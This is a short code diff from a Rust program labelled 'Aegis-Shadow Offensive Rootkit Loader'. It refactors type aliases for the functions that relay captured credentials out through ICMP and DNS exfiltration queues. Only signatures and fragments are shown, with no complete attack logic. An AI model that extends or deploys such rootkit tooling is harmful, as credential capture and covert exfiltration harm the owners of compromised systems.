@@ -29,6 +29,9 @@ use std::sync::{Arc, Mutex};
 use tokio::signal;
 use tokio::sync::watch;
 
+type IcmpExfilMap = Option<Arc<Mutex<HashMap<MapData, u32, IcmpExfilPayload>>>>;
+type DnsExfilMap = Option<Arc<Mutex<HashMap<MapData, u32, DnsExfilChunk>>>>;
+
 #[derive(Debug, Parser)]
 #[command(name = "aegis-shadow-offense")]
 #[command(about = "Aegis-Shadow Offensive Rootkit Loader", long_about = None)]
@@ -897,10 +900,7 @@ fn log_credential_capture(capture: &CredentialCapture) {
     );
 }
 
-fn relay_credential_to_icmp(
-    capture: &CredentialCapture,
-    icmp_queue: &Option<Arc<Mutex<HashMap<MapData, u32, IcmpExfilPayload>>>>,
-) {
+fn relay_credential_to_icmp(capture: &CredentialCapture, icmp_queue: &IcmpExfilMap) {
     let queue = match icmp_queue {
         Some(q) => q,
         None => return,
@@ -921,7 +921,7 @@ fn relay_credential_to_icmp(
 
 fn relay_credential_to_dns(
     capture: &CredentialCapture,
-    dns_queue: &Option<Arc<Mutex<HashMap<MapData, u32, DnsExfilChunk>>>>,
+    dns_queue: &DnsExfilMap,
     seq_counter: &AtomicU32,
 ) {
     let queue = match dns_queue {
